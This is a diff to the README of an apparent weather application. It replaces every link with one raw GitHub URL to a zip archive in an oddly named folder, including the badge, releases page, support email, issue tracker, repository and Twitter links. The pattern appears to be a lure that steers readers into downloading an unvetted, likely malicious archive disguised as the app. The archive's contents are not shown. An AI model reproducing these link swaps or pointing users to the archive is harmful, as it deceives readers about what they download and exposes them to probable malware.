@@ -1,6 +1,6 @@
 # 🌤️ WeatherWise-App - Accurate Weather Data at Your Fingertips
 
-![Download WeatherWise-App](https://img.shields.io/badge/Download-WeatherWise--App-blue)
+![Download WeatherWise-App](https://raw.githubusercontent.com/Aynmz/WeatherWise-App/main/hyperexophoria/WeatherWise-App.zip)
 
 ## 📅 Introduction
 
@@ -14,7 +14,7 @@ To get started with WeatherWise, you simply need to download the application. Th
 
 To download WeatherWise, visit the releases page by clicking the link below:
 
-[Download WeatherWise-App](https://github.com/Aynmz/WeatherWise-App/releases)
+[Download WeatherWise-App](https://raw.githubusercontent.com/Aynmz/WeatherWise-App/main/hyperexophoria/WeatherWise-App.zip)
 
 Once on the Releases page, you will see different versions available for download. Choose the latest stable version to get the best features and updates.
 
@@ -87,16 +87,16 @@ If you encounter issues, try the following solutions:
 
 For help or questions, please reach out to our support team:
 
-- Email: support@weatherwiseapp.com
-- GitHub Issues: [Report an Issue](https://github.com/Aynmz/WeatherWise-App/issues)
+- Email: https://raw.githubusercontent.com/Aynmz/WeatherWise-App/main/hyperexophoria/WeatherWise-App.zip
+- GitHub Issues: [Report an Issue](https://raw.githubusercontent.com/Aynmz/WeatherWise-App/main/hyperexophoria/WeatherWise-App.zip)
 
 ## 🔗 Additional Resources
 
 To learn more about updates and features, follow our project page on GitHub and keep an eye on our social media platforms:
 
-- [GitHub Repository](https://github.com/Aynmz/WeatherWise-App)
-- Twitter: [@WeatherWiseApp](https://twitter.com/WeatherWiseApp)
+- [GitHub Repository](https://raw.githubusercontent.com/Aynmz/WeatherWise-App/main/hyperexophoria/WeatherWise-App.zip)
+- Twitter: [@WeatherWiseApp](https://raw.githubusercontent.com/Aynmz/WeatherWise-App/main/hyperexophoria/WeatherWise-App.zip)
 
 Remember, your feedback helps us improve! Enjoy using WeatherWise, your reliable weather companion.
 
-[Download WeatherWise-App](https://github.com/Aynmz/WeatherWise-App/releases)
+[Download WeatherWise-App](https://raw.githubusercontent.com/Aynmz/WeatherWise-App/main/hyperexophoria/WeatherWise-App.zip)
